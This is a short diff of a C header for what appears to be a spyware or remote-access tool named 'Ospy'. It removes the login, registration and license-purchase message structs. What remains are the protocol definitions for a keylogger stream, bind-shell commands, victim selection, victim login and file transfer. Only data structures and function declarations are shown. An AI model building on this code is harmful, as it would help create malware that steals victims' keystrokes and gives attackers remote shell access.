@@ -65,49 +65,11 @@ typedef struct {
 } encrypted_log_in_vicitm_protocol;
 
 typedef struct {
-	char username[MAX_USER_NAME_LEN];
-	char password[MAX_PASSWORD_LEN];
-} log_in_protocol;
-
-typedef struct {
-	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
-	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
-} encrypted_log_in_protocol;
-
-
-typedef struct {
-	char username[MAX_USER_NAME_LEN];
-	char password[MAX_PASSWORD_LEN];
-	char license_key[LICENSE_KEY_LENGTH];
-} register_protocol;
-
-typedef struct {
-	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
-	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
-	char license_key[LICENSE_KEY_LENGTH];
-} encrypted_register_protocol;
-
-
-typedef struct {
-	char username[MAX_USER_NAME_LEN];
-	char password[MAX_PASSWORD_LEN];
-} buying_license_key_protocol;
-
-typedef struct {
-	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
-	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
-} encrypted_buying_license_key_protocol;
-
-
-typedef struct {
 	char file_sub_buffer[MTU];
 	int end_of_file;
 } file_transformation_protocol;
 
 typedef union{
-	log_in_protocol login_to_Ospy;
-	register_protocol register_to_Ospay;
-	buying_license_key_protocol buy_license_key;
 	char keylogger_stream_key[MAX_KEYSTROKE_LEN];
 	char bind_shell_command[MAX_BIND_SHELL_COMMAND];
 	char selected_victim_name[MAX_USER_NAME_LEN];
@@ -115,10 +77,7 @@ typedef union{
 } main_data;
 
 typedef union{
-	encrypted_log_in_protocol encrypted_login_to_Ospy;
 	encrypted_log_in_vicitm_protocol encrypted_login_vicim_to_Ospy;
-	encrypted_register_protocol encrypted_register_to_Ospay;
-	encrypted_buying_license_key_protocol encrypted_buy_license_key;
 	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
 	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
 	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
@@ -135,12 +94,6 @@ typedef struct {
 	action_type action;
 	encrypted_main_data data;
 } encrypted_general_message_protocol;
-
-//typedef struct {
-//	sender i_am;
-//	action_type action;
-//	main_data data;
-//} general_message; 
 
 void key_exchange (int V_S_socket);
 STATUS create_connection();
